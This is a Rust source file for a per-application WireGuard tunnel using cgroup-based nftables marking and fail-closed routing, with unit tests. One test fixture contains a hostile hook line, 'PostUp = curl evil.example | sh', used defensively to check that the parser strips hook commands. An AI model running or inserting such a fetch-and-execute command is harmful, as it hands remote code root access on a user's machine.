//! Per-application WireGuard tunnel.
//!
//! Only processes launched into a dedicated systemd slice are routed through
//! the tunnel; everything else on the machine keeps its normal connection.
//!
//! How a packet gets there:
//!
//! 1. The app is started in `detourtunnel.slice` (cgroup v2). Children inherit
//!    the cgroup, so a whole browser or Steam plus its games come along.
//! 2. An nftables rule marks packets whose socket belongs to that cgroup.
//! 3. A policy rule sends marked packets to a routing table whose default
//!    route is the WireGuard interface.
//! 4. Masquerade rewrites the source address to the tunnel's, since the
//!    initial route decision picked the physical interface's address.
//!
//! It fails closed: the tunnel table carries an `unreachable` default below
//! the WireGuard route, so if the interface disappears, tunnelled apps lose
//! connectivity instead of silently leaking onto the normal path.
//!
//! Nothing is persisted. All state lives in the kernel, `down` is idempotent,
//! and a reboot clears it.

use std::path::Path;
use std::process::Command;

pub const IFACE: &str = "detour0";
pub const TABLE: u32 = 51820;
pub const MARK: u32 = 0x5157;
pub const RULE_PRIORITY: u32 = 5157;
pub const NFT_TABLE: &str = "detour_tunnel";
/// No dashes: in systemd slice names a dash means nesting.
pub const SLICE: &str = "detourtunnel.slice";
/// Conservative MTU that fits inside WireGuard over most links, including
/// Cloudflare WARP. Used when the config does not set one.
pub const DEFAULT_MTU: u32 = 1280;

/// Destinations never sent through the tunnel: loopback (our DNS proxy on
/// 127.0.0.53 lives here), private LANs, link-local, and CGNAT space.
const BYPASS_V4: &[&str] = &[
    "127.0.0.0/8",
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "169.254.0.0/16",
    "100.64.0.0/10",
];
const BYPASS_V6: &[&str] = &["::1/128", "fc00::/7", "fe80::/10"];

/// `wg setconf` accepts only these keys. Everything else in a wg-quick style
/// file (Address, DNS, MTU, PostUp, ...) is dropped — in particular hook
/// commands, which must never run as root just because a file said so.
const INTERFACE_KEYS: &[&str] = &["privatekey", "listenport", "fwmark"];
const PEER_KEYS: &[&str] = &[
    "publickey",
    "presharedkey",
    "allowedips",
    "endpoint",
    "persistentkeepalive",
];

#[derive(Debug, thiserror::Error)]
pub enum TunnelError {
    #[error("WireGuard config is invalid: {0}")]
    InvalidConfig(String),
    #[error("could not read {path}: {source}")]
    Read {
        path: String,
        #[source]
        source: std::io::Error,
    },
    #[error("`{command}` failed: {stderr}")]
    Command { command: String, stderr: String },
    #[error("could not run `{command}`: {source}")]
    Spawn {
        command: String,
        #[source]
        source: std::io::Error,
    },
}

/// The parts of a WireGuard config this tunnel needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WgConfig {
    /// IPv4 interface addresses in CIDR form. IPv6 addresses are ignored: a
    /// v6 address on the tunnel would make untunnelled apps prefer IPv6 and
    /// then fail, on a host with no IPv6 route.
    pub addresses_v4: Vec<String>,
    pub mtu: Option<u32>,
    /// Config reduced to what `wg setconf` understands.
    pub setconf: String,
    pub endpoint: Option<String>,
}

impl WgConfig {
    pub fn load(path: &Path) -> Result<Self, TunnelError> {
        let text = std::fs::read_to_string(path).map_err(|source| TunnelError::Read {
            path: path.display().to_string(),
            source,
        })?;
        Self::parse(&text)
    }

    pub fn parse(text: &str) -> Result<Self, TunnelError> {
        let mut section = "";
        let mut setconf = String::new();
        let mut addresses_v4 = Vec::new();
        let mut mtu = None;
        let mut endpoint = None;
        let mut has_private_key = false;
        let mut peers = 0;
        let mut peer_has_key = Vec::new();

        for raw in text.lines() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }

            if line.starts_with('[') && line.ends_with(']') {
                section = match line.to_ascii_lowercase().as_str() {
                    "[interface]" => "interface",
                    "[peer]" => {
                        peers += 1;
                        peer_has_key.push(false);
                        "peer"
                    }
                    other => {
                        return Err(TunnelError::InvalidConfig(format!("unknown section {other}")))
                    }
                };
                setconf.push_str(line);
                setconf.push('\n');
                continue;
            }

            let Some((key, value)) = line.split_once('=') else {
                return Err(TunnelError::InvalidConfig(format!("malformed line: {line}")));
            };
            let key = key.trim().to_ascii_lowercase();
            let value = value.trim();

            match section {
                "interface" => match key.as_str() {
                    "address" => {
                        for addr in value.split(',').map(str::trim) {
                            if is_ipv4_cidr(addr) {
                                addresses_v4.push(addr.to_string());
                            }
                        }
                    }
                    "mtu" => {
                        mtu = Some(value.parse().map_err(|_| {
                            TunnelError::InvalidConfig(format!("bad MTU {value}"))
                        })?);
                    }
                    k if INTERFACE_KEYS.contains(&k) => {
                        if k == "privatekey" {
                            has_private_key = true;
                        }
                        setconf.push_str(&format!("{key} = {value}\n"));
                    }
                    _ => {}
                },
                "peer" => {
                    if PEER_KEYS.contains(&key.as_str()) {
                        if key == "publickey" {
                            if let Some(last) = peer_has_key.last_mut() {
                                *last = true;
                            }
                        }
                        if key == "endpoint" && endpoint.is_none() {
                            endpoint = Some(value.to_string());
                        }
                        setconf.push_str(&format!("{key} = {value}\n"));
                    }
                }
                _ => {
                    return Err(TunnelError::InvalidConfig(
                        "key outside of any section".to_string(),
                    ))
                }
            }
        }

        if !has_private_key {
            return Err(TunnelError::InvalidConfig("[Interface] has no PrivateKey".into()));
        }
        if peers == 0 {
            return Err(TunnelError::InvalidConfig("no [Peer] section".into()));
        }
        if peer_has_key.iter().any(|k| !k) {
            return Err(TunnelError::InvalidConfig("a [Peer] has no PublicKey".into()));
        }
        if addresses_v4.is_empty() {
            return Err(TunnelError::InvalidConfig(
                "[Interface] has no IPv4 Address".into(),
            ));
        }

        Ok(Self { addresses_v4, mtu, setconf, endpoint })
    }
}

/// Replace the `endpoint = ...` line in a setconf body.
pub fn with_endpoint(setconf: &str, endpoint: &str) -> String {
    setconf
        .lines()
        .map(|l| {
            if l.to_ascii_lowercase().starts_with("endpoint") {
                format!("endpoint = {endpoint}")
            } else {
                l.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
        + "\n"
}

/// Resolve a `host:port` endpoint to an IPv4 address. The tunnel is IPv4
/// only, and on a host without IPv6 connectivity an IPv6 endpoint would
/// bring the interface up but never complete a handshake. `wg` would take
/// whichever address the resolver lists first, so do not leave it to chance.
pub fn resolve_endpoint_v4(endpoint: &str) -> Option<String> {
    use std::net::ToSocketAddrs;
    if endpoint.parse::<std::net::SocketAddrV4>().is_ok() {
        return Some(endpoint.to_string());
    }
    endpoint
        .to_socket_addrs()
        .ok()?
        .find(|a| a.is_ipv4())
        .map(|a| a.to_string())
}

fn is_ipv4_cidr(s: &str) -> bool {
    let (ip, prefix) = s.split_once('/').unwrap_or((s, "32"));
    ip.parse::<std::net::Ipv4Addr>().is_ok() && prefix.parse::<u8>().is_ok_and(|p| p <= 32)
}

/// cgroup v2 path of the tunnel slice for a given user, and its depth.
pub fn slice_cgroup(uid: u32) -> (String, u32) {
    let path = format!("user.slice/user-{uid}.slice/user@{uid}.service/{SLICE}");
    let level = path.split('/').count() as u32;
    (path, level)
}

/// The nftables ruleset. The slice's cgroup must exist when this is loaded,
/// because nft resolves the path to an inode at load time — the GUI keeps a
/// long-lived anchor unit in the slice for exactly this reason.
pub fn nft_ruleset(uid: u32) -> String {
    let (cgroup, level) = slice_cgroup(uid);
    format!(
        "table inet {NFT_TABLE} {{\n\
         \tchain output {{\n\
         \t\ttype route hook output priority mangle; policy accept;\n\
         \t\tip daddr {{ {v4} }} return\n\
         \t\tip6 daddr {{ {v6} }} return\n\
         \t\tsocket cgroupv2 level {level} \"{cgroup}\" meta mark set {MARK:#x}\n\
         \t}}\n\
         \tchain postrouting {{\n\
         \t\ttype nat hook postrouting priority srcnat; policy accept;\n\
         \t\toifname \"{IFACE}\" masquerade\n\
         \t}}\n\
         }}\n",
        v4 = BYPASS_V4.join(", "),
        v6 = BYPASS_V6.join(", "),
    )
}

/// One setup step. Optional steps (IPv6 fail-closed) may fail on hosts with
/// IPv6 disabled without aborting the whole bring-up.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Step {
    pub argv: Vec<String>,
    pub optional: bool,
}

fn step(argv: &[&str]) -> Step {
    Step { argv: argv.iter().map(|s| s.to_string()).collect(), optional: false }
}

fn optional(argv: &[&str]) -> Step {
    Step { optional: true, ..step(argv) }
}

/// Commands to bring the tunnel up, in order. `setconf_path` and `nft_path`
/// are files already written with [`WgConfig::setconf`] and [`nft_ruleset`].
pub fn up_steps(config: &WgConfig, setconf_path: &str, nft_path: &str) -> Vec<Step> {
    let table = TABLE.to_string();
    let mark = format!("{MARK:#x}");
    let prio = RULE_PRIORITY.to_string();
    let mtu = config.mtu.unwrap_or(DEFAULT_MTU).to_string();

    let mut steps = vec![
        step(&["ip", "link", "add", IFACE, "type", "wireguard"]),
        step(&["wg", "setconf", IFACE, setconf_path]),
    ];
    for addr in &config.addresses_v4 {
        steps.push(step(&["ip", "-4", "address", "add", addr, "dev", IFACE]));
    }
    steps.extend([
        step(&["ip", "link", "set", "mtu", &mtu, "up", "dev", IFACE]),
        step(&["ip", "-4", "route", "add", "default", "dev", IFACE, "table", &table]),
        // Fail closed: if the interface goes away its route goes with it,
        // and this is what marked traffic hits instead of the main table.
        step(&["ip", "-4", "route", "add", "unreachable", "default", "metric", "4096", "table", &table]),
        step(&["ip", "-4", "rule", "add", "fwmark", &mark, "lookup", &table, "priority", &prio]),
        optional(&["ip", "-6", "route", "add", "unreachable", "default", "table", &table]),
        optional(&["ip", "-6", "rule", "add", "fwmark", &mark, "lookup", &table, "priority", &prio]),
        step(&["nft", "-f", nft_path]),
    ]);
    steps
}

/// Commands to tear everything down. Every step tolerates "already gone", so
/// this is safe to run at any time, including to clean up a half-finished up.
pub fn down_steps() -> Vec<Step> {
    let table = TABLE.to_string();
    let prio = RULE_PRIORITY.to_string();
    vec![
        optional(&["nft", "delete", "table", "inet", NFT_TABLE]),
        optional(&["ip", "-4", "rule", "del", "priority", &prio]),
        optional(&["ip", "-6", "rule", "del", "priority", &prio]),
        optional(&["ip", "-4", "route", "flush", "table", &table]),
        optional(&["ip", "-6", "route", "flush", "table", &table]),
        optional(&["ip", "link", "del", IFACE]),
    ]
}

fn run(step: &Step) -> Result<(), TunnelError> {
    let command = step.argv.join(" ");
    let output = Command::new(&step.argv[0])
        .args(&step.argv[1..])
        .output()
        .map_err(|source| TunnelError::Spawn { command: command.clone(), source })?;
    if output.status.success() {
        return Ok(());
    }
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    if step.optional {
        tracing::debug!(%command, %stderr, "optional step failed");
        return Ok(());
    }
    Err(TunnelError::Command { command, stderr })
}

/// Bring the tunnel up. Clears leftovers first, and rolls back completely if
/// any required step fails, so a failed attempt never leaves marked traffic
/// pointed at a half-built table.
pub fn up(config: &WgConfig, uid: u32, work_dir: &Path) -> Result<(), TunnelError> {
    down();

    std::fs::create_dir_all(work_dir).map_err(|source| TunnelError::Read {
        path: work_dir.display().to_string(),
        source,
    })?;
    let setconf_path = work_dir.join("wg-setconf.conf");
    let nft_path = work_dir.join("tunnel.nft");
    let setconf = match &config.endpoint {
        Some(ep) => match resolve_endpoint_v4(ep) {
            Some(v4) => {
                tracing::info!(endpoint = %ep, resolved = %v4, "pinned endpoint to IPv4");
                with_endpoint(&config.setconf, &v4)
            }
            None => {
                return Err(TunnelError::InvalidConfig(format!(
                    "could not resolve an IPv4 address for endpoint {ep}"
                )))
            }
        },
        None => config.setconf.clone(),
    };
    write_private(&setconf_path, &setconf)?;
    write_private(&nft_path, &nft_ruleset(uid))?;

    let steps = up_steps(config, &setconf_path.to_string_lossy(), &nft_path.to_string_lossy());
    let result = steps.iter().try_for_each(run);

    // The private key has been handed to the kernel; do not leave a copy.
    let _ = std::fs::remove_file(&setconf_path);

    if let Err(e) = result {
        tracing::warn!(error = %e, "tunnel bring-up failed; rolling back");
        down();
        return Err(e);
    }
    tracing::info!(iface = IFACE, "tunnel up");
    Ok(())
}

pub fn down() {
    for s in down_steps() {
        let _ = run(&s);
    }
}

fn write_private(path: &Path, contents: &str) -> Result<(), TunnelError> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(path)
        .map_err(|source| TunnelError::Read { path: path.display().to_string(), source })?;
    file.write_all(contents.as_bytes())
        .map_err(|source| TunnelError::Read { path: path.display().to_string(), source })
}

/// Whether the tunnel interface currently exists. Readable without root.
pub fn is_up() -> bool {
    Path::new("/sys/class/net").join(IFACE).exists()
}

/// Bytes received and sent on the tunnel interface, readable without root.
pub fn traffic() -> Option<(u64, u64)> {
    let base = Path::new("/sys/class/net").join(IFACE).join("statistics");
    let read = |f: &str| -> Option<u64> {
        std::fs::read_to_string(base.join(f)).ok()?.trim().parse().ok()
    };
    Some((read("rx_bytes")?, read("tx_bytes")?))
}

#[cfg(test)]
mod tests {
    use super::*;

    const WARP: &str = "\
[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 172.16.0.2/32
Address = 2606:4700:110:8a2e::1/128
DNS = 1.1.1.1
MTU = 1280
PostUp = curl evil.example | sh

[Peer]
PublicKey = bmHXTCQ6FLJb7QFnj7FnL8+R8e8HuUJb4FKpy0CVUXE=
AllowedIPs = 0.0.0.0/0
AllowedIPs = ::/0
Endpoint = engage.cloudflareclient.com:2408
";

    #[test]
    fn parses_a_warp_style_config() {
        let c = WgConfig::parse(WARP).unwrap();
        assert_eq!(c.addresses_v4, vec!["172.16.0.2/32"]);
        assert_eq!(c.mtu, Some(1280));
        assert_eq!(c.endpoint.as_deref(), Some("engage.cloudflareclient.com:2408"));
    }

    #[test]
    fn setconf_drops_wg_quick_only_keys_and_hooks() {
        let c = WgConfig::parse(WARP).unwrap();
        let s = c.setconf.to_ascii_lowercase();
        assert!(s.contains("privatekey"));
        assert!(s.contains("publickey"));
        assert!(s.contains("endpoint"));
        for forbidden in ["address", "dns", "mtu", "postup", "curl"] {
            assert!(!s.contains(forbidden), "{forbidden} must not reach wg setconf");
        }
    }

    #[test]
    fn ipv6_addresses_are_not_assigned() {
        let c = WgConfig::parse(WARP).unwrap();
        assert!(c.addresses_v4.iter().all(|a| !a.contains(':')));
    }

    #[test]
    fn rejects_config_without_private_key() {
        let text = "[Interface]\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = x\n";
        assert!(matches!(WgConfig::parse(text), Err(TunnelError::InvalidConfig(_))));
    }

    #[test]
    fn rejects_config_without_peer() {
        let text = "[Interface]\nPrivateKey = x\nAddress = 10.0.0.2/32\n";
        assert!(WgConfig::parse(text).is_err());
    }

    #[test]
    fn rejects_peer_without_public_key() {
        let text = "[Interface]\nPrivateKey = x\nAddress = 10.0.0.2/32\n[Peer]\nEndpoint = a:1\n";
        assert!(WgConfig::parse(text).is_err());
    }

    #[test]
    fn rejects_config_with_only_ipv6_address() {
        let text = "[Interface]\nPrivateKey = x\nAddress = fd00::2/128\n[Peer]\nPublicKey = y\n";
        assert!(WgConfig::parse(text).is_err());
    }

    #[test]
    fn rejects_unknown_section() {
        assert!(WgConfig::parse("[Bogus]\nKey = v\n").is_err());
    }

    #[test]
    fn endpoint_line_is_replaced_and_nothing_else() {
        let c = WgConfig::parse(WARP).unwrap();
        let out = with_endpoint(&c.setconf, "162.159.192.1:2408");
        assert!(out.contains("endpoint = 162.159.192.1:2408"));
        assert!(!out.contains("cloudflareclient"));
        assert!(out.contains("publickey"));
        assert_eq!(out.matches("endpoint").count(), 1);
    }

    #[test]
    fn literal_ipv4_endpoint_is_kept_as_is() {
        assert_eq!(resolve_endpoint_v4("1.2.3.4:51820").as_deref(), Some("1.2.3.4:51820"));
    }

    #[test]
    fn unresolvable_endpoint_yields_none() {
        assert!(resolve_endpoint_v4("no-such-host.invalid:1").is_none());
    }

    #[test]
    fn slice_path_and_level_match_systemd_layout() {
        let (path, level) = slice_cgroup(1000);
        assert_eq!(path, "user.slice/user-1000.slice/user@1000.service/detourtunnel.slice");
        assert_eq!(level, 4);
    }

    #[test]
    fn ruleset_exempts_loopback_so_dns_proxy_stays_local() {
        let r = nft_ruleset(1000);
        assert!(r.contains("127.0.0.0/8"));
        let exempt = r.find("ip daddr").unwrap();
        let mark = r.find("meta mark set").unwrap();
        assert!(exempt < mark, "exemption must be evaluated before marking");
    }

    #[test]
    fn ruleset_marks_the_slice_and_masquerades_the_tunnel() {
        let r = nft_ruleset(1000);
        assert!(r.contains("socket cgroupv2 level 4 \"user.slice/user-1000.slice/user@1000.service/detourtunnel.slice\""));
        assert!(r.contains("meta mark set 0x5157"));
        assert!(r.contains("oifname \"detour0\" masquerade"));
    }

    #[test]
    fn up_installs_fail_closed_route_before_the_rule() {
        let c = WgConfig::parse(WARP).unwrap();
        let steps = up_steps(&c, "/tmp/s", "/tmp/n");
        let pos = |needle: &str| {
            steps.iter().position(|s| s.argv.join(" ").contains(needle)).unwrap()
        };
        let unreachable = pos("unreachable default metric 4096");
        let rule = pos("-4 rule add fwmark");
        assert!(unreachable < rule, "the rule must never point at a table with no fallback");
        assert!(!steps[unreachable].optional);
    }

    #[test]
    fn up_uses_config_mtu_or_safe_default() {
        let mut c = WgConfig::parse(WARP).unwrap();
        c.mtu = None;
        let steps = up_steps(&c, "/tmp/s", "/tmp/n");
        assert!(steps.iter().any(|s| s.argv.join(" ").contains("mtu 1280 up")));
    }

    #[test]
    fn down_is_entirely_best_effort() {
        assert!(down_steps().iter().all(|s| s.optional));
    }

    #[test]
    fn only_ipv6_steps_are_optional_during_up() {
        let c = WgConfig::parse(WARP).unwrap();
        for s in up_steps(&c, "/tmp/s", "/tmp/n") {
            assert_eq!(s.optional, s.argv.contains(&"-6".to_string()), "{:?}", s.argv);
        }
    }
}
